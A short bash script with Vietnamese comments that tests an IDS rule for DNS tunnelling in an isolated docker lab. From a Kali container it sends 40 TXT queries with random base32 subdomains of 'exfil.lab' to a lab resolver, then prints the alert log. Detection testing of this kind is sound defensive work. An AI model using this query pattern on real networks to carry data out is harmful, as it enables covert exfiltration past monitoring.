#!/bin/bash
# Test rule 1000004 (DNS tunnel) truc tiep trong lab
# Gia lap giong script 04 cua Dung, nhung gui toi 172.28.0.10 de goi di qua br-lab
# Mong doi: co canh bao LAB DNS tunnel
LOG=~/lab/log/fast.log
> $LOG

C=$(head -c 16 /dev/urandom | base32 | tr -d "=" | tr A-Z a-z)
echo "[Tan cong] Gui 40 truy van DNS ten mien ngau nhien toi 172.28.0.10"
echo "    vi du ten mien: $C.phan1.exfil.lab"
sudo docker exec kali bash -c 'for i in $(seq 1 40); do C=$(head -c 16 /dev/urandom | base32 | tr -d "=" | tr A-Z a-z); dig @172.28.0.10 $C.phan$i.exfil.lab TXT +tries=1 +time=1 > /dev/null 2>&1; sleep 0.2; done'
echo "    da gui 40 truy van"

sleep 3
echo "===== fast.log ====="; cat $LOG; echo "===== het ====="
